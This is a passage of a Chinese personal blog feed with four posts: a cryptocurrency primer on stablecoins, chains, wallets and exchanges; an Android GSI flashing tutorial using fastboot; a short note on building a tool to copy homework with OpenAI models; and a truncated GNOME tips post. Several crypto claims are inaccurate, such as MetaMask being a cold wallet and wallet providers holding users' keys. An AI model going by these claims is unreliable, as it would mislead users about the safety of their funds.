    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>加密货币（Crypto）通常特指基于密码学原理，使用区块链类似技术的数字货币。例如 比特币（Bitcoin）、以太坊（Ethereum）</p><p>另外，“数字货币”“虚拟货币”“加密货币”这三个名词的在许多情况下的区别并不明确，即使是在维基百科中。但总之你只需要知道本文讨论的是 比特币、Web3 相关技术，而不是 Microsoft Rewards、Q 币或数字人民币</p><p>本文主要概述中国市场中加密货币的基本概念，会着重介绍各种技术的风险，可能会有错误和缺漏，可能会随着技术的迭代而过时。<strong>长文警告</strong></p><h2 id="生态圈"><a href="#生态圈" class="headerlink" title="生态圈"></a>生态圈</h2><p>加密货币自比特币起，已延伸出大量新式技术。这些技术在一些地方也被统称为 Web3。例如 分布式存储（IPFS、Filecoin）、去中心化交易所（Uniswap）、NFT 等</p><p>这些名词你可能都不甚了解，也没必要全都了解</p><h3 id="加密货币"><a href="#加密货币" class="headerlink" title="加密货币"></a>加密货币</h3><h4 id="稳定币"><a href="#稳定币" class="headerlink" title="稳定币"></a>稳定币</h4><p>本文主要探讨的还是加密货币本身。加密货币价格通常波动极大，所以为了在加密货币世界中进行交易，有些公司提供<strong>稳定币</strong>这类特殊的加密货币，价格与现实世界中的法定货币相锚定，作为现实世界法币与虚拟世界加密货币的桥梁，方便进行交易</p><p>最知名的稳定币就是 Tether 公司的 <a href="https://tether.to/">USDT</a>。USDT 是中心化的。Tether 宣称每铸造 1 USDT，其银行帐户都会有 1 美元存入，并且用户随时可以将自己手里的 USDT 1:1 赎回为美元。所以 USDT 价格和美元挂钩，稳定不变</p><p>但稳定币<strong>也存在风险</strong>，此前就有 Terra 的算法稳定币 USTC 脱钩事件。稳定币一旦脱钩，带来的影响将极大。假如 Tether 公司爆雷，或 Tether 存钱的银行破产，那你手里的 USDT 照样一文不值。除了 USDT，还有另一款知名稳定币 USDC，由 Circle 公司管理，同样挂钩美元，相对更透明。还有 TUSD、BUSD 等同理</p><p>市占率最高的目前还是 USDT 和 USDC</p><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><p>稳定币主要分为</p><ul><li>中心化稳定币</li><li>算法稳定币</li></ul><p>USDT、USDC 等有一个实体公司管理的稳定币就是中心化稳定币</p><p>而算法稳定币，能锚定美元的同时也去中心化。算法稳定币分各种形式，有双代币自动交换；抵押债仓（如 DAI）；还有模拟中央银行，通过控制发币量来控制价格等。这些新式稳定币也会带来<strong>相应的风险</strong>。例如陷入死亡螺旋、脱钩的 USTC&#x2F;LUNA 就是双代币自动交换的算法稳定币。</p><h4 id="主流币"><a href="#主流币" class="headerlink" title="主流币"></a>主流币</h4><p>最常听到的加密货币例如 Bitcoin、Ethereum、Litecoin、Solana 都可以算作主流币。价格也类似于现实中股票的 <em>大盘</em> ，由于交易量大以及共识机制，价格<strong>波动会比较类似、统一</strong>，短期波动相对较小，受市场情绪、新闻影响更大，波动也会影响到其他币种</p><h4 id="山寨币"><a href="#山寨币" class="headerlink" title="山寨币"></a>山寨币</h4><p>这一币种很好理解，就是那种杂七杂八的币，短期波动极大，长期来看虽也有发展较好的（例如 Dogecoin），但大都归零。风险极高。</p><h4 id="应用币"><a href="#应用币" class="headerlink" title="应用币"></a>应用币</h4><p>有一些项目会自己发行加密货币作为自己的平台&#x2F;应用币，实际上<strong>与山寨币也比较类似</strong></p><p>知名的有：</p><ul><li>Filecoin，是 IPFS 去中心化存储相关生态的代币，你可以向他人支付 Filecoin 来存储数据，Filecoin 就有了实用价值</li><li>Basic Attention Token，是 Brave Browser 的“注意力代币”，用户可以看广告来获取它，还能用它打赏给自己喜爱的创作者</li></ul><h4 id="公链币"><a href="#公链币" class="headerlink" title="公链币"></a>公链币</h4><p>公链币就是指公链原生代币，也可称为主币。加密货币依赖于区块链技术，而公用区块链要维持运行，就需要通过原生代币来奖励矿工（当然这里的矿工也不只指传统的 <em>工作量证明</em> 挖矿）。所以公链币是<strong>维持公链运行的必要条件</strong> 。事实上<strong>绝大多数主流币也属于公链币</strong></p><p>许多交易所自己发行的平台币，通常也会有一个公链生态。例如币安的 BSC 链中的公链币就是 BNB。BSC 是 <em>BNB Smart Chain</em> 的缩写，是区块链，BNB 则是 <em>Binance coin</em>，是加密货币要注意分清两者的区别。除此之外还有欧易 OKTC 中的 OKB，火币 HECO 中的 HT 等，<strong>绝大多数平台币也属于公链币</strong></p><p>公链币能在区块链中作为 <em>gas</em> （或称网络费&#x2F;燃料费）奖励给矿工，而项目方为了使公链币的价格看上去好看，也会有一系列措施。比如 <em>定期销毁&#x2F;燃烧</em> ，就是指将部分币被投入虚空钱包中，从而降低市场上对该币的持有量，达到升值的目的。但一直销毁同样是不可行的，会导致通货紧缩</p><h3 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h3><h4 id="gas"><a href="#gas" class="headerlink" title="gas"></a>gas</h4><p>加密货币依赖于区块链运行。区块链就是通过一系列数学&#x2F;密码学技术证明你拥有这个加密货币。正如上文讲公链币说的，一个公链肯定<strong>要有 gas 奖励给矿工</strong>，这样才能成新的区块把你的新交易记下来。那这个 gas 谁付呢？当然是你</p><p><strong>不同区块链的 gas 相差很多</strong>，gas 也会因为行情交易、复杂度（NFT 类最为复杂）产生波动</p><p>一般来讲，大规模区块链的 gas 会比小区块链贵的多。例如在 Ethereum 主链 ERC-20 上，一次 USDT 交易的 gas 会从一美元到近十美元不等，但在 Polygon 链上，同样的交易可能只需要 0.006 - 0.01 美元。详细信息可以参考 <a href="https://gasfeesnow.com/">https://gasfeesnow.com</a></p><h4 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h4><p>区块链主要可以这么分</p><pre><code class="mermaid" >flowchart TB    区块链 --> ETH["Ethereum"]    ETH -.- erc20("ERC-20")    ETH --> Evm["EVM"]    Evm -.- poly("Polygon")    Evm -.- bsc("BNB Smart Chain (BEP-20)")    区块链 --> TRON["Tron"]    TRON -.- trc20("TRC-20")    TRON --> Tvm["TVM"]    区块链 --> other["Solana, TON ..."]</code></pre><p>每个公链通常都会提供自己的区块链浏览器，例如 <a href="https://etherscan.io/">Etherscan</a>、<a href="https://polygonscan.com/">polygonscan</a></p><h4 id="跨链桥"><a href="#跨链桥" class="headerlink" title="跨链桥"></a>跨链桥</h4><p>不同区块链内可以有相同币种，由于网络之间的延迟以及行情波动，<strong>不同链中的代币价格会略有不同</strong>，许多项目可以从中套利。并且，不同区块链中的资产也显然是没法直接互通的</p><p>然而，你可以使用 <em>跨链桥（Cross-Chain Bridge）</em>，在不同链间转移资产。许多 DeFi&#x2F;DEX 项目都会提供跨链桥，你也可以拿交易所作为跨链桥，当然跨链桥也同样有项目跑路的风险，因为它也只是将流动池中的资产倒来倒去罢了，不同链间的资产仍是无法直接转换的</p><p>常见的跨链桥有：</p><ul><li><a href="https://multichain.org/">Multichain</a> 最为通用</li></ul><p>不同公链的生态中，通常也会提供专用于其的跨链桥，例如：</p><ul><li><a href="https://wallet.polygon.technology/polygon/bridge/deposit">Polygon Bridge</a></li></ul><h4 id="ERC-EVM"><a href="#ERC-EVM" class="headerlink" title="ERC &amp; EVM"></a>ERC &amp; EVM</h4><p>目前最大的公链就是 Ethereum（ETH）了，ETH <strong>主链</strong>是 ERC-20，除了主链，ETH 还提供 EVM</p><p> EVM 能让开发者<strong>基于 ETH</strong> 开发属于自己的公链，许多公链都是 EVM 的产物，包括 Polygon、BSC、OKTC、HECO 等等。EVM 中每个链的钱包地址都互通，区块链结构也一样，互相兼容</p><p>主流 EVM 链中，Polygon 的 gas 费一般最低</p><h4 id="Tron"><a href="#Tron" class="headerlink" title="Tron"></a>Tron</h4><p>除了 ETH 也有一些其他公链，最知名的就是 Tron 波场生态链，手续费相较 ERC-20 便宜许多，但不比 EVM 中的链便宜</p><p>Tron 的主链是 TRC-20，同样有 TVM，只是没多少基于 TVM 的公链</p><p>一般来说，要想在交易所间互通 USDT，且成本较低的链也只有 TRC-20 了，网络费 1U 左右</p><h4 id="其他链"><a href="#其他链" class="headerlink" title="其他链"></a>其他链</h4><p>除了这两者还有各种各样的链，通常是项目&#x2F;平台自己搞的。包括 Telegram 的 The Open Network 等</p><p>顺便一提：区块链其实是个大类，除了公链还有私链。许多企业自己搞的链就是私链，通常与加密货币无关</p><p>许多区块链都喜欢叫自己 XXX-20，其中的 20 就是一个数字 ID 没有什么特殊含义。例如 ERC-20 就是指 Ethereum Request for Comment 20</p><h3 id="钱包"><a href="#钱包" class="headerlink" title="钱包"></a>钱包</h3><p>终于讲到钱包了。要入门加密货币，你显然要有个钱包。这里进行一个简单的分类</p><pre><code class="mermaid" >flowchart LR    钱包 --> CW["冷钱包（Cold Wallet）"]    CW -.- metamask("MetaMask")    CW --> HardwareWallet["硬件冷钱包"]    HardwareWallet -.- lg("Ledger")    钱包 --> HW["热钱包（Hot Wallet）"]    HW -.- okxweb3wallet("欧易 Web3 钱包")    HW -.- trustwallet("Trust Wallet")    HW -- 支持 --> DeFi["去中心化金融（DeFi）"]    DeFi -.- uniswap("Uniswap")    DeFi -.- aave("AAVE")    钱包 --> EX["交易所（Exchange)"]    EX -.- binance("Binance 币安")    EX -.- okx("OKX 欧易")</code></pre><h4 id="冷钱包"><a href="#冷钱包" class="headerlink" title="冷钱包"></a>冷钱包</h4><p>作为加密货币最原始的存储方式，是<strong>最安全</strong>，最去中心化的。只要保证冷钱包设备不连网（仅在转移资产时联网），就很难有资产泄漏的风险。而且<strong>每次交易都会上链</strong>，完全可追溯。不会因为项目方跑路导致资产损失，最多是没法将资产变成真正可用的法币罢了</p><p>但对于绝大多数人，冷钱包都没有必要。一是太麻烦，要自己管理私钥，各种限价交易的功能都没有；二是各种<strong>手续费太贵</strong>。由于每次交易都要上链，而上链就要付 gas。对于绝大多数人来说，频繁的 gas 费绝对难以承担</p><p>MetaMask 就是一个知名软件冷钱包，完全开源。但软件内也附带了一个浏览器，如果你用浏览器与一些项目建立了智能合约，那这就不算冷钱包了</p><p>至于硬件冷钱包，没有必要</p><h4 id="热钱包"><a href="#热钱包" class="headerlink" title="热钱包"></a>热钱包</h4><p>热钱包介于冷钱包与交易所之间，虽然交易<strong>也要上链</strong>，但安全性相比冷钱包弱多了。实际上，热钱包的安全性完全不比交易所强。因为你的钱包私钥已被项目方完全控制，从技术上来说，他可以随时转出你的全部资产（只是项目方通常不会这么做，目前也没有发生过这种事）</p><p>但热钱包能帮助你简单便捷地交易资产，许多热钱包都附带 DEX（去中心化交易所）功能，支持 限价订单，自动跨链，自动计算最优手续费等。非常方便。同时，热钱包也能当冷钱包用，<strong>使用各种 DeFi、Dapp</strong>（冷钱包一触网就不算冷钱包了）。例如 Telegram 的 TON 区块链提供了一个叫 <em>Tonkeeper</em> 的热钱包，你可以在里面浏览各种 TON 应用，用 TON 买 Telegram Permium、用户名之类的</p><h5 id="DeFi"><a href="#DeFi" class="headerlink" title="DeFi"></a>DeFi</h5><p>你还可以将自己的热钱包中的一部分资产存入 DeFi 项目，例如 Uniswap、AAVE。你把资产存入这些项目后，钱包里的资产就变成了智能合约中的一串数字。DeFi 项目是开源的，但<strong>风险又比热钱包要高</strong>，你可能因为项目中的代码漏洞、黑客攻击导致财产损失（此类事件大大小小发生过许多次，而冷钱包区块链的技术风险相对可控）。更有可能因为项目方跑路导致财产归零</p><p>这些项目内的交易手续费相对要低，而且会提供更多高级交易功能。但热钱包通常也会整合各种 DeFi 项目，让你在热钱包中管理 DeFi 资产，同时计算最优手续费</p><p>DeFi 目前的主要优势是你可以通过提供流动性来赚取利息。由于金融原理，交易所的运行依赖流动性，DeFi 也不例外，也可以拿钱借给别人，别人拿去做杠杠、套利之类的。相当于把平台赚到的一部分钱分给你。利息依市场情况而定，USDT 在 AAVE 的 APY（年收益）有 2.45% 左右</p><h4 id="交易所"><a href="#交易所" class="headerlink" title="交易所"></a>交易所</h4><p>这里的交易所特指中心化交易所。如果没有 Dapp 的需求，绝大多数的人都只需要交易所。然而交易所的风险<strong>比以上所有的都要高</strong>，是完全<strong>中心化</strong>、闭源的，通常还受监管机构监管，要进行 KYC（实名认证）还有各种风控机制等。交易所内所有操作都不上链。假如把链上资产比作现钞，那交易所就是微信支付宝。而且交易所爆雷跑路的事件也发生过多次，影响最大的就是 FTX 死亡漩涡，用户资产完全归零</p><p>也正是 FTX 那次事件之后，许多交易所都上线了 <em>储备金证明</em> 功能，就是通过密码学证明了他们有能力在链上兑付（提现）用户充值的那些资产。例如 <a href="https://www.binance.com/zh-CN/proof-of-reserves">币安</a>、<a href="https://www.okx.com/cn/proof-of-reserves">欧易</a>。值得注意的是，不是所有交易所都有储备金证明，例如 <em>火币</em> 目前就没有</p><p>交易所虽然风险高，但整体仍然是可用的。你随时可以选择将交易所内的资产提现到区块链上（交易所不跑路的话）。交易所提供最为全面的金融功能，看 K 线、限价、杠杠、策略等等等等，手续费也更为固定，更低。部分交易所还提供 <em>闪兑</em> 功能，<strong>0 手续费</strong>。交易所中的交易以 <em>交易对</em> 形式呈现，例如 ETH&#x2F;USDT 的价格就表示 1 BTC 能兑换多少 USDT，而不是 1 BTC 值多少美元，只是 1 USDT 与 1 美元一样罢了。同理你也就能知道为什么 ETH&#x2F;USDT、ETH&#x2F;USDC、ETH&#x2F;BTC 的价格会不一样了</p><h5 id="法币交易"><a href="#法币交易" class="headerlink" title="法币交易"></a>法币交易</h5><p>最关键的是，大多数交易所都提供友好的法币交易选项。在中国，加密货币交易不受法律保护。但许多交易所仍在中国提供服务。他们通常支持 C2C 或称 P2P 的方式来将法定货币转为加密货币。一般要先购买 USDT 或类似稳定币再进行交易</p><p>C2C 即 Consumer To Consumer，类似闲鱼这类平台，用户可以在平台上找到卖加密货币的卖家，然后与卖家一对一交易。人民币可以通过支付宝、微信之类的方式转到卖家的<strong>个人</strong>账户上，然后卖家再通过平台给买家放行加密货币。遇到纠纷&#x2F;卖家跑路时，平台可以担保赔偿</p><p>许多交易所为了防止洗钱等法律风险，设置了各种风控机制。这里列举几个国内可用知名交易所的风控策略：</p><ul><li><p>币安对于任何交易都要求 T+1，即自交易日起一天（24 时）后才能动用资产，包括提现、卖出、交易等。根据风控情况冻结时间可能更长</p></li><li><p>欧易则是 T+N，会根据系统风控来决定资产冻结时间，多次交易后可能会不需要冻结</p></li><li><p>火币也是 T+N，但对于新用户，大多数法币交易都不会设冻结期</p></li></ul><p>同时，由于中国对加密货币的打击，或者钱的来源不干净，许多买卖家的个人账户也可能被支付宝、微信风控。与其交易可能导致你自己的账号也<strong>遭到风控冻结</strong>。这种情况只能和支付宝微信的客服联系，部分交易所的客服可能也会帮你，有些交易所的部分商家（例如币安的 Pro）支持对这种情况的赔偿，但大多数都不会赔</p><h2 id="其他资源"><a href="#其他资源" class="headerlink" title="其他资源"></a>其他资源</h2><p>可能有帮助的链接：</p><ul><li><a href="https://www.okx.com/cn/learn">OKX 新手学院</a></li><li><a href="https://learn.metamask.io/overview">MetaMask Learn</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
      <tag>Web3</tag>
      
      <tag>加密货币</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无限可能的定制 ROM - 即使是未开源内核的新机（或没有 Device Tree）</title>
    <link href="/archives/58fc3f75/"/>
    <url>/archives/58fc3f75/</url>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>一般，要给手机刷个自定义 ROM，你得等你的手机制造商把内核开源，然后有别人写它的 Device Tree 等等，又有人做了移植，你才能用上各种 TWRP 啊、LineageOS 啊。自己做 Device Tree、自己编译的难度是可想而知</p><p>然而，这一切很大程度上依赖你所用机型的知名程度。如果这手机没啥名气，或者手机刚出来不久，就不会有很多刷机资源。更何况，如果设备制造商不将内核开源，那更什么都别想了</p><p>所幸，现在安卓有了 GSI，GSI 具体指的是 <a href="https://developer.android.google.cn/topic/generic-system-image">通用系统镜像</a>。顾名思义，就是（几乎）同时适用于所有安卓设备的系统镜像，不需要说 ROM 去单独适配每个机型。如今，安卓 9 以上大多数较新的设备都已支持 GSI</p><p>本教程主要是针对 Fastbootd 模式下的刷入，你一般也可以使用自定义 Recovery 来操作（视情况而定）</p><h2 id="选择适合的-GSI"><a href="#选择适合的-GSI" class="headerlink" title="选择适合的 GSI"></a>选择适合的 GSI</h2><p>这里有一个相对全面的 GSI 列表可供选择：</p><p><a href="https://github.com/phhusson/treble_experimentations/wiki/Generic-System-Image-%28GSI%29-list">https://github.com/phhusson/treble_experimentations/wiki/Generic-System-Image-%28GSI%29-list</a></p><p>如果这个设备没有那么冷门。建议搜索该设备的 XDA、Telegram、Discord 社区</p><h2 id="预备条件"><a href="#预备条件" class="headerlink" title="预备条件"></a>预备条件</h2><ul><li>已解锁引导加载程序（BL锁）、符合 Treble 要求（支持 GSI）的安卓设备</li><li>能够运行 <a href="https://developer.android.google.cn/studio/releases/platform-tools">Android SDK Platform-Tools</a>（adb、fastboot）的计算机</li><li>计算机能通过数据线连接并识别到该安卓设备</li><li>需要刷入的 GSI 系统镜像。通常是 <strong>img 格式</strong>，而不是 zip 或文件夹</li><li>提前<strong>备份数据</strong>，刷入 ROM 的操作必须双清（data、cache）。BTW：适用于原系统的备份工具很可能不适用于你将刷的新系统</li></ul><h2 id="刷入-GSI"><a href="#刷入-GSI" class="headerlink" title="刷入 GSI"></a>刷入 GSI</h2><h3 id="1-刷入底包"><a href="#1-刷入底包" class="headerlink" title="1. 刷入底包"></a>1. 刷入底包</h3><p>刷入绝大多数 GSI 前你需要先保证这个设备是能<strong>正常进入系统</strong>的。通常建议是设备出厂自带的系统，或者是最新且相对稳定的系统。这个步骤是<strong>必要</strong>的，因为 GSI 镜像不包含设备需要的全部文件，而仅包含 system 分区，需要使用原先系统的字库基带、recovery 等。原先系统也被称为底包，可以使用设备制造商提供的工具（如 MiFlash）刷入</p><h3 id="2-进入-Fastbootd"><a href="#2-进入-Fastbootd" class="headerlink" title="2. 进入 Fastbootd"></a>2. 进入 Fastbootd</h3><p>如果设备支持 Fastbootd（绝大多数），那么 GSI 需要在 <a href="https://source.android.google.cn/docs/core/architecture/bootloader/fastbootd?hl=zh-cn">Fastbootd</a> 模式下刷入，注意不是 Fastboot。</p><p>设备进入 Fastboot 后，在计算机终端输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fastboot reboot fastboot<br></code></pre></td></tr></table></figure><p>设备即可进入 Fastbootd 模式，此时设备屏幕的显示可能会有些不一样，例如显示为“FASTBOOTD”。你可以通过在终端输入以下命令来验证：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fastboot getvar is-userspace<br></code></pre></td></tr></table></figure><p>返回 <code>yes</code> 即 Fastbootd 模式</p><h3 id="3-刷入-System"><a href="#3-刷入-System" class="headerlink" title="3. 刷入 System"></a>3. 刷入 System</h3><p>在终端运行以下命令擦除原有系统分区：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fastboot erase system<br></code></pre></td></tr></table></figure><p>然后运行以下命令来将 GSI 镜像刷入系统分区</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fastboot flash system [镜像位置]<br></code></pre></td></tr></table></figure><blockquote><p>提示：大多数终端和系统中，你可以通过把文件拖入终端中来自动填充文件路径</p></blockquote><p>此步骤可能耗时较长</p><h3 id="4-双清，进入系统"><a href="#4-双清，进入系统" class="headerlink" title="4. 双清，进入系统"></a>4. 双清，进入系统</h3><p>运行以下命令来双清：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fastboot -w<br></code></pre></td></tr></table></figure><p>双清即清除 data 和 dalvik(cache) 分区。也可能清除其它必要的分区中的数据。这个步骤会清除所有已安装的应用和用户数据，但不会清除 <code>/sdcard/</code>中的数据</p><p>这时，应该已经能够进入系统了。你也可以运行以下命令来重启到系统：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fastboot reboot<br></code></pre></td></tr></table></figure><p>享受你的新系统吧 🎉</p><h2 id="附加-使用自定义-Recovery"><a href="#附加-使用自定义-Recovery" class="headerlink" title="附加 - 使用自定义 Recovery"></a>附加 - 使用自定义 Recovery</h2><p>一般来讲，要给设备刷机、ROOT 还会刷入一个自定义 Recovery，便于刷改等。但注意这部分是<strong>可选</strong>的，而且这部分内容只针对 <a href="https://source.android.google.cn/docs/core/ota/ab">A&#x2F;B 分区</a>设备</p><p>A&#x2F;B 分区设备没有通常意义上的 Recovery 分区，但不是完全没有。在加载 system 分区前，系统会先加载 boot 分区，而我们仍然能在 boot 分区中动手脚</p><h3 id="温故知新"><a href="#温故知新" class="headerlink" title="温故知新"></a>温故知新</h3><p>在传统非 A&#x2F;B 设备上刷入 Recovery 一般使用 <code>fastboot flash recovery</code> 命令，注意指令中的 <code>flash</code> 说明这是直接将镜像<em>刷入</em>了 Recovery 分区</p><p>而在 A&#x2F;B 分区设备中，我们通常是用 <code>fastboot boot</code> 命令使设备临时<em>启动</em>指定的镜像文件，注意命令中没有 <code>flash</code>，这说明这个操作并不是将镜像文件刷入设备，而只是启动它</p><p>这也意味着，假如你使用 <code>fastboot flash boot</code> 命令，就会将镜像彻底刷入 boot 分区。但如果你真这么做了，你就会发现设备一开机就进入 Recovery，无法进入系统。这是因为大多数自定义 Recovery 的 boot 镜像并不能接管原先的启动逻辑，而是直接将其整个替换为了 Recovery 自己</p><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>你需要先找到适合你机型、安卓版本的 Recovery，Recovery 就没有类似 GSI 那种通用镜像了，但类似设备（例如处理器相同）间可能是可以通刷的</p><p>注意要确认该 Recovery 是否支持 A&#x2F;B 分区，支持 A&#x2F;B 分区的 Recovery 通常会提供两个镜像文件，一个标注 <code>BOOT</code>，一个标注 <code>RECOVERY</code> 或类似字样。这表示了这两个镜像所要被刷入的分区，这里需要下载标注为 <code>BOOT</code> 的</p><p>设备进入 Fastboot 模式，注意现在不是上文提到的 Fastbootd 了。Fastbootd 模式下功能比 Fastboot 少</p><p>运行以下命令启动到于 Boot 分区的 Recovery 中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fastboot boot [镜像位置]<br></code></pre></td></tr></table></figure><p> 成功后不必手动重启，因为这个操作并不是刷入</p><p>进入 Recovery 后，高级选项中一般还会提供一个“刷入 ramdisk”或“刷入当前 TWRP”的功能。这个功能能固化 Recovery。即将当前 Recovery 分别刷入 A&#x2F;B 每一分区中的 recovery 分区，然后修改系统原先的 boot 分区，使其能完成原先启动逻辑的同时，也能进入 Recovery</p>]]></content>
    
    
    <categories>
      
      <category>简单教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>Linux</tag>
      
      <tag>Android</tag>
      
      <tag>玩机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>新项目 - Collector 作业助手</title>
    <link href="/archives/dd7e9d99/"/>
    <url>/archives/dd7e9d99/</url>
    
    <content type="html"><![CDATA[<p>刚开始个新项目，就是利用 OpenAI 现在大火的语言模型抄作业</p><p>手动 OCR、调格式太麻烦了，想直接做个工具</p><p>看上去网上还没啥人做过这类的</p><p>名字想好了 叫 <strong>Collector</strong> 收集者</p><p>收集答案（划掉</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>技术</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GNOME 还能这么干！？你绝对不知道的 GNOME 桌面技巧</title>
    <link href="/archives/a6d8538a/"/>
    <url>/archives/a6d8538a/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.gnome.org/">GNOME</a> 作为知名的现代 Linux 桌面环境，以易用、美观、简单著称，它也是 Ubuntu 现在默认的桌面。当然，它也广被人诟病它的封闭性、以及它相比其它 DE（Desktop Environment）低得多的可自定义性。</p><p>然而，GNOME 表面上限制颇多。但实际上就论功能性，它并不比其它 DE 差。这篇文章就将介绍几个鲜为人知的 GNOME 小技巧。</p><h2 id="Tweaks"><a href="#Tweaks" class="headerlink" title="Tweaks"></a>Tweaks</h2><p>GNOME 的 Tweaks 优化工具十分实用，可以设置主题、鼠标加速、顶栏时钟等等一堆东西</p><p>在 外观 TAB 中，你就可以设置用户主题、图标、光标等。用户主题可以从网络上找</p><p><img src="https://cdn.jiecs.top/img/2023/02/%E6%88%AA%E5%9B%BE%202023-02-06%2016-15-55.webp" alt="Tweaks"></p><p>你还能设置各个地方的字体。其中，字体的 缩放比例 选项对高分屏用户十分实用，它能在不启用显示器“分数比例缩放”的情况下<strong>细粒度调节整体界面比例</strong>。与显示器的缩放效果略有差别，但它不会像分数比例缩放那样导致性能、兼容问题。设置中无障碍选项的“大号文本”功能也是修改这一选项。</p><p>另外 附加模态对话框、居中显示新窗口 也很有用，试试就知道了。</p><p>你可以直接在 Ubuntu Software 中找到这一工具。</p><h2 id="Extensions"><a href="#Extensions" class="headerlink" title="Extensions"></a>Extensions</h2><p>GNOME 还有一套独有的插件系统。你可以通过<a href="https://extensions.gnome.org/">网页</a>来选择插件安装。插件可扩展桌面各方面的功能。插件间也互相不影响，可以直接禁用或卸载，不留残留。</p><p>Ubuntu 就自带了几个插件，所以 Ubuntu 上 GNOME 的行为和纯 GNOME 的行为有些差异。</p><p>这里将推荐几个我用的插件，都可以直接在插件市场搜到</p><h3 id="插件管理器"><a href="#插件管理器" class="headerlink" title="插件管理器"></a>插件管理器</h3><p>先推荐一个插件管理器：</p><p><img src="https://cdn.jiecs.top/img/2023/02/%E6%88%AA%E5%9B%BE%202023-02-06%2016-03-00.webp" alt="Extension Manager 商店页面"></p><p>这个插件管理器是非官方的（官方插件管理器的作者为“GNOME 项目”）。但它允许你在应用内浏览插件市场、更新插件。界面也比官方的好看很多。</p><p>直接从 Ubuntu Software 或 Flathub 安装即可。名字就叫 Extension Manager</p><h3 id="Caffeine"><a href="#Caffeine" class="headerlink" title="Caffeine"></a>Caffeine</h3><p>Caffeine 是一个知名 GNOME 插件，用于临时禁用系统的自动休眠设定（保持唤醒），非常实用。安装后会在托盘显示一个小咖啡杯，点击开启再点击关闭。使用非常简单</p><p>你也可以在插件管理器中配置 Caffeine。设置通知提示、快捷键等</p><h3 id="Snap-Manager-Lite"><a href="#Snap-Manager-Lite" class="headerlink" title="Snap Manager Lite"></a>Snap Manager Lite</h3><p>Ubuntu 中，管理 Snap 应用一般是直接用 Ubuntu Software。但 Ubuntu Software 有时总是很慢很卡，进度显示不清晰，体验不咋好，而且遇到自己更新自己的时候还会挂起。</p><p>这个 Snap Manager 也是在托盘有个图标。就相当于是 Snap 命令行的 GUI 快捷方式，快得多也方便得多。</p><h3 id="Clipboard-Indicator"><a href="#Clipboard-Indicator" class="headerlink" title="Clipboard Indicator"></a>Clipboard Indicator</h3><p>剪切板历史记录。类似 Windows 中的 Win + V，但固定在顶栏上。目前<a href="https://github.com/Tudmotu/gnome-shell-extension-clipboard-indicator/pull/286">还不支持图片</a>，这对我算刚需。所以现在我暂时还在用 CopyQ。</p><h2 id="文件应用"><a href="#文件应用" class="headerlink" title="文件应用"></a>文件应用</h2><p>GNOME 默认的文件应用是 Nautilus。很好看，但确实很难用。</p><div class="note note-info">            <p>我相信不只有我一个人在第一次用的时候，不知道怎么复制文件路径。Ctrl + L 这 TM 谁能想得到</p>          </div><h3 id="右键新建文档"><a href="#右键新建文档" class="headerlink" title="右键新建文档"></a>右键新建文档</h3><p>Nautilus 一个缺失的重要功能就是右键新建文档。</p><p>但你知道吗，你实际上可以把你需要的任何文件模板放在 <code>~/Templates</code> 下（中文路径为 <code>模板</code>）</p><p>这里的文件会在 右键菜单 - 新建文档 中出现，你可以添加任何类型的文件（包括 Office 等）</p><p><img src="https://cdn.jiecs.top/img/2023/02/20230206174810.webp" alt="右键菜单"></p><h3 id="快速预览"><a href="#快速预览" class="headerlink" title="快速预览"></a>快速预览</h3><p><strong>Sushi</strong> 可以快速预览文件，就像 Windows 上的各类软件一样，对文件按空格来快速预览。能预览文本、图片、视频等。</p><p>在 Ubuntu Software 文件应用的附加组件处就能找到 Sushi。安装后运行 <code>nautilus -q</code> 来退出并重启文件应用使之生效。</p><h3 id="网络位置"><a href="#网络位置" class="headerlink" title="网络位置"></a>网络位置</h3><p>令人难以置信的是，GNOME 支持 Google Drive 文件系统，并且能和系统文件应用无缝融合。</p><p>你只需要在 设置 - 在线账户 处登录 Google 账号即可，文件应用中就会出现相应内容。</p><p><img src="https://cdn.jiecs.top/img/2023/02/%E6%88%AA%E5%9B%BE%202023-02-06%2017-12-17.webp?70" alt="Google Drive 属性"></p><p>在线账户还支持 Next Cloud 等，但微软的 OneDrive 不行。你还是要用 rClone 之类的工具。</p><p>自带的连接服务器功能也支持各种协议：FTP、SFTP、WebDAV、Samba、NFS、AppleTalk</p><h3 id="位置历史记录"><a href="#位置历史记录" class="headerlink" title="位置历史记录"></a>位置历史记录</h3><p>你可以右键 后退按钮 来看最近的到过的位置并且跳转。这有时很有用。</p><h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><h3 id="Super-键"><a href="#Super-键" class="headerlink" title="Super 键"></a>Super 键</h3><p>GNOME 的 Super 键就是指 